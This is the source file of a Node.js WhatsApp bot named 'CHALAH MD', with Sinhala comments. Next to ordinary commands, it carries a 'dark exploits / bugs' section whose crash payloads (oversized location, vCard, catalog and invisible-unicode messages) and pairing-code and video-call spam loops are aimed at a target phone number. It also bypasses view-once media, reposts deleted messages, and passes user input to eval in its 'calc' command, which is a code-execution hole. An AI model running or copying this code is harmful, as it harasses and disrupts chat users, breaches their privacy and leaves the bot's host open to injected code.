const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeInMemoryStore, 
    jidNormalizedUser, 
    downloadMediaMessage 
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const axios = require('axios');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk');
const figlet = require('figlet');
const os = require('os');

// Configuration
const config = {
    botName: "CHALAH MD",
    ownerNumber: "94742271802@s.whatsapp.net", // ඔබේ නම්බර් එක දාන්න
    prefix: ".",
    autoSeen: true,
    autoLike: true,
    antiDelete: true,
    logo: "https://files.catbox.moe/07hh33.png"
};

// Store for deleted messages
const deletedMessages = new Map();

// Welcome banner
console.clear();
console.log(chalk.cyan(figlet.textSync('CHALAH MD', { horizontalLayout: 'full' })));
console.log(chalk.green('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
console.log(chalk.yellow('🤖 Bot Starting...'));
console.log(chalk.yellow('📱 Version: 1.0.0'));
console.log(chalk.yellow('👨‍💻 Created by: Chalah Developer'));
console.log(chalk.green('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'));

// Store setup
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
    
    const sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        auth: state,
        browser: ['Super Bot', 'Chrome', '1.0.0']
    });

    store.bind(sock.ev);

    // Connection update
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom)
                ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut
                : true;
            
            console.log(chalk.red('Connection closed. Reconnecting...'), shouldReconnect);
            
            if (shouldReconnect) {
                startBot();
            }
        } else if (connection === 'open') {
            console.log(chalk.green('✅ Bot Connected Successfully!'));
            console.log(chalk.cyan('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        }
    });

    sock.ev.on('creds.update', saveCreds);

    // Message handler
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        try {
            const msg = messages[0];
            if (!msg.message || msg.key.fromMe) return;

            const from = msg.key.remoteJid;
            const body = msg.message?.conversation || 
                        msg.message?.extendedTextMessage?.text || 
                        msg.message?.imageMessage?.caption || 
                        msg.message?.videoMessage?.caption || '';
            
            const isGroup = from.endsWith('@g.us');
            const sender = isGroup ? msg.key.participant : from;
            const pushname = msg.pushName || 'User';

            // Auto Seen
            if (config.autoSeen) {
                await sock.readMessages([msg.key]);
            }

            // Store message for anti-delete
            if (config.antiDelete) {
                deletedMessages.set(msg.key.id, {
                    message: msg.message,
                    from: from,
                    sender: sender,
                    pushname: pushname,
                    timestamp: Date.now()
                });
            }

            // Command handler
            if (body.startsWith(config.prefix)) {
                const args = body.slice(config.prefix.length).trim().split(/ +/);
                const command = args.shift().toLowerCase();

                console.log(chalk.yellow(`[CMD] ${pushname}: ${config.prefix}${command}`));

                // Reply function
                const reply = async (text) => {
                    await sock.sendMessage(from, { text: text }, { quoted: msg });
                };

                // Menu Command
                if (command === 'menu') {
                    const menuText = `
┏━━━━━━〔 ☣️ *CHALAH VOID* ☣️ 〕━━━━━━┓
┃
┃  👤 *USER:* @${(msg.key.participant || from).split('@')[0]}
┃  📅 *DATE:* ${date}
┃  ⌚ *TIME:* ${time}
┃  🚀 *PREFIX:* ${prefix}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃
┃  ☢️ *[ ᴅᴀʀᴋ ᴇxᴘʟᴏɪᴛꜱ / ʙᴜɢꜱ ]*
┃  ┌───────────────────────────
┃  │ ☣️ ${prefix}msgblock [num]
┃  │ ☣️ ${prefix}pairspam [num]
┃  │ ☣️ ${prefix}callspam [num]
┃  │ ☣️ ${prefix}locationbug [num]
┃  │ ☣️ ${prefix}vcardbug [num]
┃  │ ☣️ ${prefix}ghostbug [num]
┃  │ ☣️ ${prefix}catalogbug [num]
┃  │ ☣️ ${prefix}destroyer (Groups)
┃  └───────────────────────────
┃
┃  ⚡ *[ ꜱʏꜱᴛᴇᴍ / ᴍᴀɪɴ ]*
┃  ┌───────────────────────────
┃  │ 🛠️ ${prefix}ping
┃  │ 🛠️ ${prefix}alive
┃  │ 🛠️ ${prefix}system
┃  │ 🛠️ ${prefix}owner
┃  │ 👁️ ${prefix}vv (ViewOnce Bypass)
┃  └───────────────────────────
┃
┃  📥 *[ ᴅᴏᴡɴʟᴏᴀᴅᴇʀꜱ ]*
┃  ┌───────────────────────────
┃  │ 🎵 ${prefix}song [name]
┃  │ 🎥 ${prefix}video [name]
┃  │ 📱 ${prefix}tiktok [url]
┃  │ 📘 ${prefix}fb [url]
┃  └───────────────────────────
┃
┃  🎨 *[ ᴍᴇᴅɪᴀ ᴛᴏᴏʟꜱ ]*
┃  ┌───────────────────────────
┃  │ ✨ ${prefix}sticker
┃  │ 🖼️ ${prefix}toimage
┃  │ 🎧 ${prefix}tomp3
┃  └───────────────────────────
┃
┃  ⚙️ *[ ʙᴏᴛ ᴄᴏɴꜰɪɢ ]*
┃  ┌───────────────────────────
┃  │ ✅ Status: Online
┃  │ 🛡️ Mode: Public
┃  │ 🧬 Version: 1.0.4
┃  └───────────────────────────
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

🤖 *Powered by Chalana Induwara*
📱 Type ${config.prefix}help [cmd] for details
`;
                    await sock.sendMessage(from, {
                        image: { url: config.logo },
                        caption: menuText
                    });
                }

                // Alive Command
                else if (command === 'alive') {
                    const uptime = process.uptime();
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = Math.floor(uptime % 60);
                    
                    const aliveText = `
╭━━━〔 BOT STATUS 〕━━━⬣
┃
┃ 🤖 *Bot Name:* ${config.botName}
┃ ⏱️ *Uptime:* ${hours}h ${minutes}m ${seconds}s
┃ 📊 *Status:* Active & Running
┃ 🚀 *Speed:* Ultra Fast
┃ 💚 *Health:* 100%
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`;
                    await sock.sendMessage(from, {
                        image: { url: config.logo },
                        caption: aliveText
                    });
                }

                // Ping Command
                else if (command === 'ping') {
                    const startTime = Date.now();
                    const msg = await reply('🏓 Pinging...');
                    const endTime = Date.now();
                    const ping = endTime - startTime;
                    
                    await sock.sendMessage(from, {
                        text: `⚡ *Pong!*\n📶 Speed: ${ping}ms`,
                        edit: msg.key
                    });
                }

                // System Command
                else if (command === 'system') {
                    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
                    const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
                    const usedMem = (totalMem - freeMem).toFixed(2);
                    const cpus = os.cpus();
                    
                    const systemText = `
╭━━━〔 SYSTEM INFO 〕━━━⬣
┃
┃ 💻 *Platform:* ${os.platform()}
┃ 🏗️ *Architecture:* ${os.arch()}
┃ 📦 *Node Version:* ${process.version}
┃ 
┃ 🧠 *CPU:* ${cpus[0].model}
┃ 🔢 *Cores:* ${cpus.length}
┃ 
┃ 💾 *Total RAM:* ${totalMem} GB
┃ 🟢 *Free RAM:* ${freeMem} GB
┃ 🔴 *Used RAM:* ${usedMem} GB
┃ 
┃ ⏱️ *Uptime:* ${(os.uptime() / 3600).toFixed(2)} hours
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`;
                    await reply(systemText);
                }

                // Info Command
                else if (command === 'info') {
                    const infoText = `
╭━━━〔 BOT INFO 〕━━━⬣
┃
┃ 🤖 *Bot Name:* ${config.botName}
┃ 📌 *Version:* 1.0.0
┃ 👨‍💻 *Developer:* Chalana Induwara
┃ 🌐 *Language:* JavaScript/Node.js
┃ 📚 *Library:* Baileys
┃ 
┃ ⚙️ *Features:*
┃ • 50+ Commands
┃ • Download Media
┃ • Group Management
┃ • Auto Features
┃ • Anti Delete
┃ • And More!
┃
┃ 📱 Type ${config.prefix}menu for commands
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`;
                    await sock.sendMessage(from, {
                        image: { url: config.logo },
                        caption: infoText
                    });
                }

                // VV Command (View Once)
                else if (command === 'vv') {
                    if (!msg.message?.viewOnceMessageV2) {
                        return reply('❌ Reply කරන්න view once message එකකට!');
                    }
                    
                    const viewOnceMsg = msg.message.viewOnceMessageV2.message;
                    
                    if (viewOnceMsg.imageMessage) {
                        await sock.sendMessage(from, {
                            image: await downloadMediaMessage(msg, 'buffer', {}),
                            caption: '👁️ View Once Image එක මෙන්න!'
                        });
                    } else if (viewOnceMsg.videoMessage) {
                        await sock.sendMessage(from, {
                            video: await downloadMediaMessage(msg, 'buffer', {}),
                            caption: '👁️ View Once Video එක මෙන්න!'
                        });
                    }
                }

                // Owner Command
                else if (command === 'owner') {
                    await sock.sendMessage(from, {
                        contacts: {
                            displayName: 'Bot Owner',
                            contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bot Owner\nTEL;type=CELL;type=VOICE;waid=${config.ownerNumber.split('@')[0]}:${config.ownerNumber.split('@')[0]}\nEND:VCARD` }]
                        }
                    });
                }

                // Sticker Command
                else if (command === 'sticker' || command === 's') {
                    if (!msg.message?.imageMessage && !msg.message?.videoMessage) {
                        return reply('❌ Reply කරන්න image/video එකකට!');
                    }
                    
                    await reply('⏳ Sticker එක හදනවා...');
                    // Sticker conversion logic here
                    await reply('✅ Sticker එක හැදුවා!');
                }

                // Download Commands
                else if (command === 'song') {
                    if (!args[0]) return reply('❌ පාට නමක් දෙන්න!\nඋදාහරණය: .song Despacito');
                    await reply('⏳ Song එක Download වෙනවා...');
                    // Download logic here
                }

                else if (command === 'video') {
                    if (!args[0]) return reply('❌ Video නමක් දෙන්න!');
                    await reply('⏳ Video එක Download වෙනවා...');
                    // Download logic here
                }

                // Group Commands
                else if (command === 'tagall') {
                    if (!isGroup) return reply('❌ මෙය group command එකක්!');
                    
                    const groupMetadata = await sock.groupMetadata(from);
                    let text = '╭━━━〔 TAG ALL 〕━━━⬣\n\n';
                    
                    for (let member of groupMetadata.participants) {
                        text += `┃ @${member.id.split('@')[0]}\n`;
                    }
                    text += '\n╰━━━━━━━━━━━━━━━━━━━━⬣';
                    
                    await sock.sendMessage(from, {
                        text: text,
                        mentions: groupMetadata.participants.map(a => a.id)
                    });
                }

                else if (command === 'groupinfo') {
                    if (!isGroup) return reply('❌ මෙය group command එකක්!');
                    
                    const groupMetadata = await sock.groupMetadata(from);
                    const groupText = `
╭━━━〔 GROUP INFO 〕━━━⬣
┃
┃ 📝 *Name:* ${groupMetadata.subject}
┃ 🆔 *ID:* ${groupMetadata.id}
┃ 👥 *Members:* ${groupMetadata.participants.length}
┃ 👑 *Admins:* ${groupMetadata.participants.filter(p => p.admin).length}
┃ 📅 *Created:* ${new Date(groupMetadata.creation * 1000).toLocaleDateString()}
┃ 📜 *Description:* ${groupMetadata.desc || 'නැත'}
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`;
                    await reply(groupText);
                }
                
                //Bug Commamd List 
                
else if (command === 'locationbug') {
    if (!args[0]) return sock.sendMessage(from, { text: "අංකය ඇතුළත් කරන්න (947xxxxxxxx)" });
    const target = args[0].includes('@s.whatsapp.net') ? args[0] : args[0] + '@s.whatsapp.net';
    
    for (let i = 0; i < 5; i++) {
        await sock.sendMessage(target, {
            location: { 
                degreesLatitude: -25.274398, 
                degreesLongitude: 133.775136,
                name: "💀 CHALAH VOID 404 💀".repeat(500),
                address: "☠️ ERROR".repeat(500)
            }
        });
    }
    await sock.sendMessage(from, { text: "Location Payload Sent! 💉" });
}

else if (command === 'catalogbug') {
    if (!args[0]) return sock.sendMessage(from, { text: "අංකය ඇතුළත් කරන්න." });
    const target = args[0] + '@s.whatsapp.net';
    
    await sock.sendMessage(target, {
        shopMessage: {
            surface: 1,
            id: '1234567',
            messageVersion: 1,
            showUpsell: true
        },
        caption: "System Overload".repeat(1000)
    });
}


else if (command === 'vcardbug') {
    const target = args[0] + '@s.whatsapp.net';
    const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                  'FN:CHALAH DESTROYER\n' + 
                  'ORG:VOID;\n' + 
                  'TEL;type=CELL;type=VOICE;waid=' + args[0] + ':+' + args[0] + '\n' + 
                  'NOTE:' + "☣️".repeat(20000) + '\n' + 
                  'END:VCARD';

    await sock.sendMessage(target, { 
        contacts: { 
            displayName: 'CHALAH-BUG', 
            contacts: [{ vcard }] 
        }
    });
}

else if (command === 'ghostbug') {
    const target = args[0] + '@s.whatsapp.net';
    const ghost = "‎".repeat(50000); // Invisible characters
    await sock.sendMessage(target, { text: ghost + "💀 CHALAH BUG 💀" });
}


else if (command === 'destroyer') {
    if (!from.endsWith('@g.us')) return sock.sendMessage(from, { text: "මෙය Group එකක පමණක් පාවිච්චි කරන්න." });
    const metadata = await sock.groupMetadata(from);
    const participants = metadata.participants.map(v => v.id);
    
    await sock.sendMessage(from, { 
        text: "☣️ SYSTEM OVERLOAD INITIATED ☣️", 
        mentions: participants 
    });
}

else if (command === 'msgblock') {
    if (!args[0]) return sock.sendMessage(from, { text: "Target නම්බර් එක දෙන්න." });
    const target = args[0] + '@s.whatsapp.net';
    const overload = "҈".repeat(60000); // Heavy unicode characters
    
    await sock.sendMessage(target, { 
        text: `*☣️ SYSTEM CRITICAL ERROR ☣️*\n${overload}`,
        contextInfo: { 
            externalAdReply: { 
                title: "FATAL ERROR", 
                body: "CHAT_TERMINATED", 
                mediaType: 1, 
                thumbnailUrl: "https://files.catbox.moe/07hh33.png" 
            } 
        } 
    });
    await sock.sendMessage(from, { text: "Chat Block Payload Sent! 💉" });
}

else if (command === 'pairspam') {
    if (!args[0]) return sock.sendMessage(from, { text: "Target නම්බර් එක දෙන්න." });
    const target = args[0].replace(/[^0-9]/g, '');
    
    await sock.sendMessage(from, { text: `Pairing Spam Started for ${target}... ⚡` });

    for (let i = 0; i < 50; i++) { // වාර 50ක් Request යවයි
        try {
            await sock.requestPairingCode(target);
            await new Promise(resolve => setTimeout(resolve, 500)); // Delay එකක් දාන්න
        } catch (e) { console.log("Limit hit"); }
    }
}

else if (command === 'callspam') {
    if (!args[0]) return sock.sendMessage(from, { text: "Target නම්බර් එක දෙන්න." });
    const target = args[0] + '@s.whatsapp.net';
    
    await sock.sendMessage(from, { text: "Initiating Call Stress Test... ⚠️" });

    for (let i = 0; i < 20; i++) {
        // Baileys වල offer function එක හරහා video call signal එකක් යැවීම
        await sock.offerCall(target, { isVideo: true }); 
        await new Promise(resolve => setTimeout(resolve, 300));
    }
 
}        

    
               // Utility Commands
                else if (command === 'calc') {
                    if (!args[0]) return reply('❌ Calculation එකක් දෙන්න!\nඋදාහරණය: .calc 5+5');
                    
                    try {
                        const result = eval(args.join(' '));
                        await reply(`🔢 *Result:* ${result}`);
                    } catch (err) {
                        await reply('❌ Invalid calculation!');
                    }
                }

                else if (command === 'google') {
                    if (!args[0]) return reply('❌ Search query එකක් දෙන්න!');
                    const query = args.join(' ');
                    await reply(`🔍 *Google Search:*\nhttps://www.google.com/search?q=${encodeURIComponent(query)}`);
                }

                // Settings Commands
                else if (command === 'settings') {
                    const settingsText = `
╭━━━〔 SETTINGS 〕━━━⬣
┃
┃ 👁️ Auto Seen: ${config.autoSeen ? '✅ On' : '❌ Off'}
┃ ❤️ Auto Like: ${config.autoLike ? '✅ On' : '❌ Off'}
┃ 🗑️ Anti Delete: ${config.antiDelete ? '✅ On' : '❌ Off'}
┃
┃ Use ${config.prefix}toggle [setting] to change
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`;
                    await reply(settingsText);
                }

                else {
                    await reply(`❌ Command එක හම්බුනේ නැහැ!\n📱 Type ${config.prefix}menu for commands`);
                }
            }

        } catch (error) {
            console.error(chalk.red('[ERROR]'), error);
        }
    });

    // Anti-Delete Handler
    sock.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update.messageStubType === 68) { // Message deleted
                const deletedMsg = deletedMessages.get(update.key.id);
                
                if (deletedMsg && config.antiDelete) {
                    await sock.sendMessage(update.key.remoteJid, {
                        text: `
╭━━━〔 ANTI DELETE 〕━━━⬣
┃
┃ 🗑️ *Message Deleted!*
┃ 👤 *Sender:* @${deletedMsg.sender.split('@')[0]}
┃ ⏰ *Time:* ${new Date(deletedMsg.timestamp).toLocaleString()}
┃
╰━━━━━━━━━━━━━━━━━━━━⬣
`,
                        mentions: [deletedMsg.sender]
                    });
                    
                    // Forward the deleted message
                    await sock.sendMessage(update.key.remoteJid, deletedMsg.message);
                }
            }
        }
    });

    return sock;
}

// Start the bot
startBot().catch(err => {
    console.error(chalk.red('Bot Error:'), err);
    process.exit(1);
});
